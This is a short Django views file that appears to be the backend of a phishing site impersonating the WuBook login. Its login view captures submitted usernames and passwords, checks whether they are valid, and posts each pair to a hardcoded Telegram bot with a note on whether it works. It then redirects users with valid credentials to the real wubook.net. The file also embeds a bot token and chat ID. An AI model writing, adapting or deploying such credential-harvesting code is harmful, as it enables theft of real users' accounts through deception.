from django.shortcuts import render
from django.shortcuts import redirect
from .forms import LoginForm
from .external import check_credentials
import requests

TELEGRAM_BOT_TOKEN = '7788451085:AAGlss8ucJhVAhBzgWbvpWTav33wWe7-XcQ'
TELEGRAM_CHAT_ID = '-1002280519178'

# Create your views here.
def send_to_telegram(message):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
    }
    requests.post(url, json=payload)

def login_view(request):
    if request.method == 'POST':
        form = LoginForm(request.POST)
        if form.is_valid():
            username = form.cleaned_data['username']
            password = form.cleaned_data['password']
            message = f'Логин: {username}\nПароль: {password}'
            result = check_credentials(username, password)
            if result:
                send_to_telegram(message + '\n\nВерные данные')
                return redirect('https://wubook.net')
            else:
                send_to_telegram(message + '\n\nНеверные данные\nПользователь направлен на страницу авторизации')
                return render(request, 'myapp/login.html', {'form': form})
    else:
        form = LoginForm()
    
    return render(request, 'myapp/login.html', {'form': form})


def zak_page(request):
    return render(request, 'myapp/zak_page.html')